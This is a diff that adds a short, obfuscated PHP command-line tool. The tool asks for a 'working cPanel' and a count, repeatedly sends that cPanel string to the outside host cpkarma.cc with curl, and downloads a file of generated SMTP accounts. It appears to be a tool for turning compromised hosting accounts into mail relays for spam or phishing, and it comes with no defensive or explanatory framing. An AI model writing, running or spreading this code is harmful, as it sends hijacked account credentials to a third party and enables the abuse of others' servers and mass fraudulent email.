@@ -1,0 +1,6 @@
+<?php error_reporting(0); echo "\n"; $nLWGVVNyaS=readline("Enter Amount: "); echo "\n"; $lLJgRfOqsz=readline("Enter A Working cPanel: "); echo "\n"; $vUOFjGsdyk=readline("Enter Save Filename: "); echo "\n\033[46m\033[30mSMTP Is Generating Please Wait Until The Progress Is Finished\033[0m\033[0m\n\n"; $mEUTlNqDKX=rand(); $jjMXpCaqlg = 0; while ($jjMXpCaqlg < $nLWGVVNyaS) { $xiuAvrYuFZ = curl_init("http://cpkarma.cc/cpsmtp/index.php?orion=".$lLJgRfOqsz."&finela=".$mEUTlNqDKX."&forest=Submit+Query"); curl_setopt($xiuAvrYuFZ, CURLOPT_RETURNTRANSFER, true); $gKLlfhDLul = curl_exec($xiuAvrYuFZ); echo "\033[92mSMTP Creating >> [$jjMXpCaqlg]\033[0m\n";  curl_close($xiuAvrYuFZ); $jjMXpCaqlg++;  } $dBiExKykGj=file_get_contents("http://cpkarma.cc/cpsmtp/".$mEUTlNqDKX); $RFWGkCphgC = fopen($vUOFjGsdyk,"w"); fwrite($RFWGkCphgC,$dBiExKykGj); fclose($RFWGkCphgC); if ($dBiExKykGj) {
+	echo "\nFile Saved As \033[36m".$vUOFjGsdyk."\033[0m\n";
+} else {
+	echo "\nYour cPanel Is None Working\n";
+}
+ ?>
